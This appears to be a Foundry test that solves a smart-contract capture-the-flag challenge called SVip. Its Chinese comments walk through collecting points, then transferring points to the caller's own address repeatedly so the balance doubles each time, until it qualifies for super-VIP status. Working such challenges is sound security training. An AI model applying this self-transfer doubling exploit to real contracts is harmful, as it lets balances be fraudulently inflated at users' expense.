// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/02.challenge/SVip.sol";

contract attackTest is Test {

    SVip svip;

    function setUp() public{
        svip =  new SVip();
    }

    function test_isComplete() public {
        // 先获得10分，别999次这么多了，可能gas不足或者达到gaslimit
        for(uint256 i = 0;i < 10; i++){
            svip.getPoint();
        }
        // 然后用这10分来不断2倍乘，8次够了，我们来个10次
        // 10-20-40-80-160-320-640-1280
        for(uint256 i = 0;i < 10; i++){
            // 注意要余额减1，因为不能全部分数转出去
            svip.transferPoints(address(this), svip.points(address(this)) - 1);
        }
        // 成为超级VIP
        svip.promotionSVip();
        assertEq(svip.isComplete(),true);
    }

}
